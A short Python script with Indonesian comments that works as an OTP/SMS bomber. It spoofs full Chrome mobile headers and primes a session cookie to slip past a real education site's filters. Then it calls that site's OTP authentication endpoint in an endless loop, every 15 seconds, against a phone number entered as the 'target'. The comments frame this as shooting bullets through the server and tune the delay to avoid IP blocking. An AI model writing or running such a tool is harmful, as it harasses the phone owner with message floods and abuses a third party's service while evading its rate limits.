import requests
import time
import random

def brutal_stealth(target):
    # Format 08xxx
    num = target.replace("+62", "0") if target.startswith("+62") else target
    
    # KUNCI UTAMA: Header yang SANGAT Lengkap (Copy-paste dari Chrome Asli)
    headers = {
        'authority': 'dashboard.skillacademy.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://skillacademy.com',
        'referer': 'https://skillacademy.com/',
        'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36'
    }

    print(f"[*] Mencoba menembus filter untuk {num}...")
    
    try:
        # Pake Session biar ada jejak Cookie
        with requests.Session() as s:
            # Pancing dulu biar dapet Cookie
            s.get("https://skillacademy.com/", headers=headers, timeout=10)
            
            # Baru nembak
            res = s.post("https://dashboard.skillacademy.com/api/v1/auth/otp", 
                         json={"phoneNumber": num}, headers=headers, timeout=15)
            
            if res.status_code == 200:
                print("\033[32m[SUCCESS]\033[0m Peluru Tembus!")
            else:
                print(f"\033[31m[FAIL]\033[0m Server Nolak ({res.status_code})")
    except Exception as e:
        print(f"\033[33m[TIMEOUT]\033[0m Jaringan diblokir provider.")

target = input("Target (08xxx): ")
while True:
    brutal_stealth(target)
    # Jeda 15 detik (Wajib, jangan dikurangi biar IP gak hangus)
    time.sleep(15)
